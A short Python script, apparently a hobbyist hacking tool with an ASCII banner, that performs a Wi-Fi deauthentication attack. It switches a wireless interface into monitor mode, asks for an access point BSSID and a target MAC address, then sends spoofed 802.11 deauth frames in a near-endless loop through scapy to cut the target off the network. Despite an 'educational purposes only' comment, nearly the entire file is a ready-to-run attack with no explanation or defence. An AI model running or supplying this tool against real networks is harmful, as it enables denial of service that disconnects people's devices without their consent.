#this is just a simple script for educational purposes only
import subprocess
from colorama import Fore
from numpy import choose
from scapy.all import *

def banner():
  print("""
  ██████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
  ██╔══██╗╚════██╗██║  ██║██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
  ██║  ██║ █████╔╝███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
  ██║  ██║ ╚═══██╗╚════██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
  ██████╔╝██████╔╝     ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
  ╚═════╝ ╚═════╝      ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                    
  Maded by Eneajkl

  Version:1.0

  """)

def monitorModeOn():
  subprocess.call(["systemctl","stop","NetworkManager"])
  subprocess.call(["sudo","ifconfig", interface, "down"])
  subprocess.call(["sudo","iwconfig", interface, "mode", "monitor"])
  subprocess.call(["sudo","ifconfig", interface, "up"])

def monitorModeOff():
  subprocess.call(["ifconfig", interface, "down"])
  subprocess.call(["sudo","iwconfig", interface, "mode", "managed"])
  subprocess.call(["sudo","ifconfig", interface, "up"])
  subprocess.call(["sudo","systemctl","start","NetworkManager"])

print(Fore.LIGHTYELLOW_EX )
banner()
print(Fore.LIGHTRED_EX)

interface=str(input("Interface:"))

monitorModeOn()

bssid=str(input("BSSID: "))
targetmac=str(input("Target's MAC address: "))
choose=str(input("Start sending packets (Y/n)"))
if choose == "Y" or choose == "y":
  dot11 = Dot11(addr1=targetmac, addr2=bssid, addr3=bssid)
  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
  sendp(packet, inter=0.1, count=99999999999999, iface=interface, verbose=1)
  monitorModeOff()
elif choose == "n" or choose == "N":
  monitorModeOff()

subprocess.call(["clear"])
print(Fore.LIGHTYELLOW_EX )
banner()
print(Fore.LIGHTRED_EX)
print("\nSee you later...\nPress any key to exit")
input()
